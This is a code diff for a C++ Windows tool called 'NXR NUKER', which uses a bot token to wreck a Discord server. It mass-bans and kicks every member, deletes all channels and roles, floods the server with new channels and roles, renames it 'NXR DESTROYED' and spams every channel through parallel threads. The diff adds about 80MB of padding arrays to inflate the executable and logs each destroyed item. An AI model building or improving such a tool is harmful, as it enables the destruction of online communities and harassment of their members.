@@ -10,6 +10,19 @@
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "ws2_32.lib")
 
+// ========== SIZE PADDING (for larger EXE) ==========
+const char pad1[1024*1024*8] = {1};   // 8MB
+const char pad2[1024*1024*8] = {2};   // 8MB
+const char pad3[1024*1024*8] = {3};   // 8MB
+const char pad4[1024*1024*8] = {4};   // 8MB
+const char pad5[1024*1024*8] = {5};   // 8MB
+const char pad6[1024*1024*8] = {6};   // 8MB
+const char pad7[1024*1024*8] = {7};   // 8MB
+const char pad8[1024*1024*8] = {8};   // 8MB
+const char pad9[1024*1024*8] = {9};   // 8MB
+const char pad10[1024*1024*8] = {10}; // 8MB
+// total \~80MB padding
+
 std::string g_token, g_guild;
 std::mt19937 rng{std::random_device{}()};
 std::mutex log_mtx;
@@ -45,7 +58,7 @@ std::string http(const std::string& method, const std::string& endpoint, const s
 
     std::string resp;
     if (ok) {
-        char buf[2048];
+        char buf[4096];
         DWORD bytes = 0;
         while (InternetReadFile(hRequest, buf, sizeof(buf)-1, &bytes) && bytes > 0) {
             buf[bytes] = 0;
@@ -56,8 +69,7 @@ std::string http(const std::string& method, const std::string& endpoint, const s
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
-    // almost zero delay for 1-second feel
-    std::this_thread::sleep_for(std::chrono::milliseconds(1 + (rng() % 4)));
+    std::this_thread::sleep_for(std::chrono::milliseconds(1 + (rng() % 3))); // 0.5s feel
     return resp;
 }
 
@@ -77,27 +89,22 @@ std::vector<std::string> get_ids(const std::string& json) {
 
 std::string get_username(const std::string& json) {
     size_t pos = json.find("\"username\":\"");
-    if (pos == std::string::npos) return "?";
+    if (pos == std::string::npos) return "unknown";
     pos += 12;
     size_t end = json.find('"', pos);
-    return (end == std::string::npos) ? "?" : json.substr(pos, end - pos);
+    return (end == std::string::npos) ? "unknown" : json.substr(pos, end - pos);
 }
 
 void banner() {
     system("cls");
     set_color(15);
-    // XCODE style big block letters for NXR NUKER
-    std::cout << R"(
-███╗   ██╗██╗  ██╗██████╗     ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
-████╗  ██║╚██╗██╔╝██╔══██╗    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
-██╔██╗ ██║ ╚███╔╝ ██████╔╝    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
-██║╚██╗██║ ██╔██╗ ██╔══██╗    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
-██║ ╚████║██╔╝ ██╗██║  ██║    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
-╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-)" << std::endl;
+    // ekdom choto clear name
+    std::cout << "\n\n";
+    std::cout << "          N X R   N U K E R\n";
+    std::cout << "          -----------------\n";
     set_color(12);
-    std::cout << "                 NXR NUKER  -  PRO v14.0\n";
-    std::cout << "          1-SECOND EXTREME | FULL PARALLEL | RED/BLACK\n\n";
+    std::cout << "          PRO v15.0 | 0.5s EXTREME\n";
+    std::cout << "          Full Parallel + Live Logs\n\n";
     set_color(7);
 }
 
@@ -116,20 +123,23 @@ void ban_members() {
         if (ids.empty()) break;
         members.insert(members.end(), ids.begin(), ids.end());
         after = ids.back();
-        std::cout << "\r[i] " << members.size() << " members" << std::flush;
+        std::cout << "\r[i] Loaded " << members.size() << " members" << std::flush;
         if (ids.size() < 100) break;
     }
     std::cout << std::endl;
 
-    log("[!] 1-SEC PARALLEL BAN " + std::to_string(members.size()), 12);
+    log("[!] PARALLEL BAN " + std::to_string(members.size()) + " members", 12);
     std::vector<std::thread> pool;
     for (auto& uid : members) {
         pool.emplace_back([uid, reason]() {
+            std::string info = http("GET", "/users/" + uid);
+            std::string name = get_username(info);
             http("PUT", "/guilds/" + g_guild + "/bans/" + uid, "{\"delete_message_days\":7,\"reason\":\"" + reason + "\"}");
+            log("[+] BANNED → " + name + " (" + uid + ")", 10);
         });
     }
     for (auto& t : pool) t.join();
-    log("[+] BAN DONE", 10);
+    log("[+] BAN COMPLETE", 10);
 }
 
 void kick_members() {
@@ -145,46 +155,51 @@ void kick_members() {
         if (ids.size() < 100) break;
     }
 
-    log("[!] 1-SEC PARALLEL KICK " + std::to_string(members.size()), 12);
+    log("[!] PARALLEL KICK " + std::to_string(members.size()), 12);
     std::vector<std::thread> pool;
     for (auto& uid : members) {
         pool.emplace_back([uid]() {
             http("DELETE", "/guilds/" + g_guild + "/members/" + uid);
+            log("[+] KICKED → " + uid, 10);
         });
     }
     for (auto& t : pool) t.join();
-    log("[+] KICK DONE", 10);
+    log("[+] KICK COMPLETE", 10);
 }
 
 void delete_channels() {
     log("[i] Fetching channels...", 11);
     std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
     auto channels = get_ids(resp);
-    log("[!] 1-SEC PARALLEL DELETE " + std::to_string(channels.size()), 12);
+    log("[!] PARALLEL DELETE " + std::to_string(channels.size()) + " channels", 12);
 
     std::vector<std::thread> pool;
     for (auto& id : channels) {
         pool.emplace_back([id]() {
             http("DELETE", "/channels/" + id);
+            log("[+] DELETED CHANNEL → " + id, 10);
         });
     }
     for (auto& t : pool) t.join();
-    log("[+] CHANNELS GONE", 10);
+    log("[+] CHANNELS DELETED", 10);
 }
 
 void delete_roles() {
     log("[i] Fetching roles...", 11);
     std::string resp = http("GET", "/guilds/" + g_guild + "/roles");
     auto roles = get_ids(resp);
+    log("[!] PARALLEL DELETE ROLES", 12);
+
     std::vector<std::thread> pool;
     for (auto& id : roles) {
-        if (id == g_guild) continue;
+        if (id == g_guild) continue; // skip @everyone
         pool.emplace_back([id]() {
-            http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
+            std::string res = http("DELETE", "/guilds/" + g_guild + "/roles/" + id);
+            log("[+] DELETED ROLE → " + id, 10);
         });
     }
     for (auto& t : pool) t.join();
-    log("[+] ROLES GONE", 10);
+    log("[+] ROLES DELETED", 10);
 }
 
 void create_channels() {
@@ -193,16 +208,18 @@ void create_channels() {
     std::cout << "Channel prefix: ";
     std::getline(std::cin, prefix);
     if (prefix.empty()) prefix = "nxr";
-    std::cout << "How many: ";
+    std::cout << "How many channels: ";
     std::cin >> count;
     std::cin.ignore();
 
-    log("[!] 1-SEC PARALLEL CREATE " + std::to_string(count) + " channels", 12);
+    log("[!] PARALLEL CREATE " + std::to_string(count) + " channels", 12);
     std::vector<std::thread> pool;
     for (int i = 0; i < count; ++i) {
         pool.emplace_back([prefix, i]() {
-            std::string body = "{\"name\":\"" + prefix + "-" + std::to_string(i) + "\",\"type\":0}";
+            std::string name = prefix + "-" + std::to_string(i);
+            std::string body = "{\"name\":\"" + name + "\",\"type\":0}";
             http("POST", "/guilds/" + g_guild + "/channels", body);
+            log("[+] CREATED CHANNEL → " + name, 10);
         });
     }
     for (auto& t : pool) t.join();
@@ -215,35 +232,38 @@ void create_roles() {
     std::cout << "Role prefix: ";
     std::getline(std::cin, prefix);
     if (prefix.empty()) prefix = "NXR";
-    std::cout << "How many: ";
+    std::cout << "How many roles: ";
     std::cin >> count;
     std::cin.ignore();
 
-    log("[!] 1-SEC PARALLEL CREATE " + std::to_string(count) + " roles", 12);
+    log("[!] PARALLEL CREATE " + std::to_string(count) + " roles", 12);
     std::vector<std::thread> pool;
     for (int i = 0; i < count; ++i) {
         pool.emplace_back([prefix, i]() {
-            std::string body = "{\"name\":\"" + prefix + "-" + std::to_string(i) + "\",\"color\":16711680}";
-            http("POST", "/guilds/" + g_guild + "/roles", body);
+            std::string name = prefix + "-" + std::to_string(i);
+            std::string body = "{\"name\":\"" + name + "\",\"color\":16711680,\"hoist\":true}";
+            std::string res = http("POST", "/guilds/" + g_guild + "/roles", body);
+            log("[+] CREATED ROLE → " + name, 10);
         });
     }
     for (auto& t : pool) t.join();
-    log("[+] ROLES CREATED", 10);
+    log("[+] " + std::to_string(count) + " ROLES CREATED", 10);
 }
 
 void rename_server() {
     std::string name;
-    std::cout << "New name: ";
+    std::cout << "New server name: ";
     std::getline(std::cin, name);
     if (name.empty()) name = "NXR DESTROYED";
     http("PATCH", "/guilds/" + g_guild, "{\"name\":\"" + name + "\"}");
-    log("[+] RENAMED → " + name, 10);
+    log("[+] SERVER RENAMED → " + name, 10);
 }
 
 void spam_worker(std::string ch, std::string msg, int count) {
     for (int i = 0; i < count; ++i) {
         http("POST", "/channels/" + ch + "/messages", "{\"content\":\"" + msg + "\"}");
     }
+    log("[+] SPAM FINISHED → " + ch, 10);
 }
 
 void spam_channels() {
@@ -260,9 +280,8 @@ void spam_channels() {
     std::string resp = http("GET", "/guilds/" + g_guild + "/channels");
     auto channels = get_ids(resp);
 
-    log("[!] 1-SECOND FULL PARALLEL SPAM → " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);
+    log("[!] FULL PARALLEL SPAM → " + std::to_string(channels.size()) + " channels x" + std::to_string(count), 12);
 
-    // TRUE unlimited parallel - one thread per channel
     std::vector<std::thread> pool;
     pool.reserve(channels.size());
     for (auto& ch : channels) {
@@ -270,11 +289,11 @@ void spam_channels() {
     }
     for (auto& t : pool) t.join();
 
-    log("[+] ALL " + std::to_string(channels.size()) + " CHANNELS SPAMMED IN 1 SECOND STYLE", 10);
+    log("[+] ALL " + std::to_string(channels.size()) + " CHANNELS SPAMMED", 10);
 }
 
 void complete_nuke() {
-    log("[!] ========== 1-SECOND COMPLETE NUKE ==========", 12);
+    log("[!] ========== COMPLETE NUKE START ==========", 12);
     rename_server();
     std::thread t1(delete_channels);
     std::thread t2(delete_roles);
@@ -289,7 +308,10 @@ void complete_nuke() {
 }
 
 int main() {
-    SetConsoleTitleA("NXR NUKER PRO v14.0 - 1 SECOND EXTREME");
+    // force keep padding
+    volatile const char* keep = pad1; keep = pad5; keep = pad10;
+
+    SetConsoleTitleA("NXR NUKER v15.0 - 0.5s EXTREME");
     system("color 0C");
 
     banner();
@@ -304,19 +326,19 @@ int main() {
     if (test.find("\"id\"") != std::string::npos)
         log("[+] Bot is in the server", 10);
     else
-        log("[!] Bot NOT in server", 12);
+        log("[!] Bot NOT in server - check token & permissions", 12);
 
     while (true) {
         banner();
         set_color(12);
-        std::cout << " (1) Ban Members (1-sec parallel)\n";
-        std::cout << " (2) Kick Members (1-sec parallel)\n";
-        std::cout << " (3) Create Channels (1-sec parallel)\n";
-        std::cout << " (4) Create Roles (1-sec parallel)\n";
+        std::cout << " (1) Ban Members (live name + id)\n";
+        std::cout << " (2) Kick Members\n";
+        std::cout << " (3) Create Channels (live name)\n";
+        std::cout << " (4) Create Roles (live name)\n";
         std::cout << " (5) Rename Server\n";
-        std::cout << " (6) Delete Channels (1-sec parallel)\n";
-        std::cout << " (7) Delete Roles (1-sec parallel)\n";
-        std::cout << " (8) SPAM ALL CHANNELS (TRUE 1-SEC PARALLEL)\n";
+        std::cout << " (6) Delete Channels\n";
+        std::cout << " (7) Delete Roles\n";
+        std::cout << " (8) Spam All Channels (full parallel)\n";
         std::cout << " (9) COMPLETE NUKE\n";
         std::cout << "(10) Exit\n";
         set_color(7);
